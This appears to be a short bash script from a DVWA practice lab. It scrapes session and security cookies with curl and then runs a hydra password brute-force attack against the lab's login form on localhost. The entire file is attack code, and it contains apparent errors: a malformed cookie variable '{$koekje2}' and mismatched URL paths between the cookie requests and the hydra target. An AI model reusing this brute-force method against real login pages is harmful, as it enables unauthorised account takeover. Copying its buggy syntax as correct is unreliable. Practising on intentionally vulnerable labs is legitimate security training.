#!/bin/bash
ip=localhost
koekje1=$(curl http://localhost/vulnerabilities/brute/ -s0 -I | grep "Set-Cookie" | sed -n '1!p' | sed 's/[^ ]* *//' | awk '{gsub("; path=/", "");print}' | grep security )
koekje2=$(curl http://localhost/vulnerabilities/brute/ -s0 -I | grep "Set-Cookie" | sed -n '1!p' | sed 's/[^ ]* *//' | awk '{gsub("; path=/", "");print}' | grep PHPSESSID)
hydra $ip -l admin -P /home/philip/wordlist.txt http-get-form "/dvwa/vulnerabilities/brute/index.php:username=^USER^&password=^PASS^&Login=Login:Username and/or password incorrect.:H=Cookie: ${koekje1};{$koekje2}"
